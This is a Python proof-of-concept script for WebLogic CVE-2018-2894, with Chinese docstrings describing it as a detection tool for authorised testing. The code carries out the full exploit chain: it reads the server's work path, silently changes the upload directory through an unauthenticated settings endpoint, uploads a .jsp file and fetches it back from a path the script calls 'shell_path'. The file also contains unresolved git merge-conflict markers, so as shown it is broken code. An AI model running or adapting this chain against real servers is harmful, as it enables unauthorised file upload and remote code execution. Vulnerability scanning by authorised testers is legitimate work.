#!/usr/bin/env python
# coding:utf-8
<<<<<<< HEAD
"""
WebLogic CVE-2018-2894 POC 检测脚本

漏洞描述：
Oracle WebLogic Server 的 Web Service Test Page 存在任意文件上传漏洞（CVE-2018-2894）。
攻击者可以通过修改上传路径来上传恶意文件，从而实现远程代码执行。

影响版本：
- Oracle WebLogic Server 10.3.6.0
- Oracle WebLogic Server 12.1.3.0
- Oracle WebLogic Server 12.2.1.2
- Oracle WebLogic Server 12.2.1.3

检测原理：
通过获取当前工作路径，修改上传路径到可访问的目录，
上传一个测试文件，然后尝试访问该文件。如果能够成功访问，
则说明存在漏洞。

使用方法：
    python cve_2018_2894_poc.py
    或在代码中调用 poc(url) 函数

参数说明：
    url: 目标URL，如 http://127.0.0.1:7001
    timeout: 请求超时时间（秒），默认10秒

返回值：
    (True, '存在漏洞') - 检测到漏洞
    (False, '安全') - 未检测到漏洞
    (False, '扫描失败 - 错误信息') - 扫描过程中出现错误

注意：
    此POC仅用于安全测试和授权的渗透测试，请勿用于非法用途。
"""

=======
>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
import re
import time
import requests
import xml.etree.ElementTree as ET

<<<<<<< HEAD
def get_current_work_path(host, timeout=10):
    """
    获取当前工作路径
    
    Args:
        host: 目标主机URL
        timeout: 请求超时时间（秒），默认10秒
    
    Returns:
        str: 当前工作路径
    
    Raises:
        Exception: 如果无法获取工作路径
    """
=======

def get_current_work_path(host, timeout=10):
>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
    geturl = host + "/ws_utc/resources/setting/options/general"
    ua = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0'}
    values = []
    try:
        request = requests.get(geturl, timeout=timeout)
        if request.status_code == 404:
            raise Exception("[-] {}  don't exists CVE-2018-2894".format(host))
        elif "Deploying Application".lower() in request.text.lower():
            print("[*] First Deploying Website Please wait a moment ...")
            time.sleep(20)
            request = requests.get(geturl, headers=ua, timeout=timeout)
        if b"</defaultValue>" in request.content:
            root = ET.fromstring(request.content)
            value = root.find("section").find("options")
            for e in value:
                for sub in e:
                    if e.tag == "parameter" and sub.tag == "defaultValue":
                        values.append(sub.text)
    except requests.ConnectionError:
        raise Exception("[-] Cannot connect url: {}".format(geturl))
    except Exception as e:
        raise Exception(str(e))
        
    if values:
        return values[0]
    else:
        # print("[-] Cannot get current work path\n")
        raise Exception("[-] Cannot get current work path")

<<<<<<< HEAD
def get_new_work_path(host, timeout=10):
    """
    获取新的上传路径
    
    Args:
        host: 目标主机URL
        timeout: 请求超时时间（秒），默认10秒
    
    Returns:
        str: 新的上传路径
    """
=======

def get_new_work_path(host, timeout=10):
>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
    origin_work_path = get_current_work_path(host, timeout)
    works = "/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css"
    if "user_projects" in origin_work_path:
        if "\\" in origin_work_path:
            works = works.replace("/", "\\")
            current_work_home = origin_work_path[:origin_work_path.find("user_projects")] + "user_projects\\domains"
            dir_len = len(current_work_home.split("\\"))
            domain_name = origin_work_path.split("\\")[dir_len]
            current_work_home += "\\" + domain_name + works
        else:
            current_work_home = origin_work_path[:origin_work_path.find("user_projects")] + "user_projects/domains"
            dir_len = len(current_work_home.split("/"))
            domain_name = origin_work_path.split("/")[dir_len]
            current_work_home += "/" + domain_name + works
    else:
        current_work_home = origin_work_path
        # print("[*] cannot handle current work home dir: {}".format(origin_work_path))
    return current_work_home

<<<<<<< HEAD
def set_new_upload_path(host, path, timeout=10):
    """
    设置新的上传路径
    
    Args:
        host: 目标主机URL
        path: 新的上传路径
        timeout: 请求超时时间（秒），默认10秒
    
    Returns:
        bool: 是否设置成功
    
    Raises:
        Exception: 如果设置失败
    """
=======

def set_new_upload_path(host, path, timeout=10):
>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
    data = {
        "setting_id": "general",
        "BasicConfigOptions.workDir": path,
        "BasicConfigOptions.proxyHost": "",
        "BasicConfigOptions.proxyPort": "80"}
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest', }
    request = requests.post(host + "/ws_utc/resources/setting/options", data=data, headers=headers, timeout=timeout)
    if b"successfully" in request.content:
        return True
    else:
        # print("[-] Change New Upload Path failed")
        raise Exception("Change New Upload Path failed")

<<<<<<< HEAD
def poc(url, timeout=10):
    """
    检测目标是否存在 WebLogic CVE-2018-2894 漏洞
    
    Args:
        url: 目标URL，如 http://127.0.0.1:7001
        timeout: 请求超时时间（秒），默认10秒
    
    Returns:
        tuple: (是否存在漏洞, 结果消息)
    """
=======

def poc(url, timeout=10):
>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
    username = "admin"
    if url.endswith('/'): url = url[:-1]
    
    try:
        vulnurl = "/ws_utc/resources/setting/keystore"
        new_work_path = get_new_work_path(url, timeout)
        set_new_upload_path(url, new_work_path, timeout)
        upload_content = username + " test"
        files = {
            "ks_edit_mode": "false",
            "ks_password_front": username,
            "ks_password_changed": "true",
            "ks_filename": ("360sglab.jsp", upload_content)
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest', }

        request = requests.post(url + vulnurl, files=files, timeout=timeout)
        response = request.text
        match = re.findall("<id>(.*?)</id>", response)
        if match:
            tid = match[-1]
            shell_path = url + "/ws_utc/css/config/keystore/" + str(tid) + "_360sglab.jsp"
            if bytes(upload_content, encoding="utf8") in requests.get(shell_path, headers=headers, timeout=timeout).content:
                print("[+] {} exists CVE-2018-2894".format(url))
                print("[+] Check URL: {} ".format(shell_path))
                return True, 'WebLogic CVE-2018-2894: 存在漏洞'
            else:
                return False, 'WebLogic CVE-2018-2894: 安全'
        else:
             return False, 'WebLogic CVE-2018-2894: 安全'
    except Exception as e:
        return False, f'WebLogic CVE-2018-2894: 扫描失败 - {str(e)}'
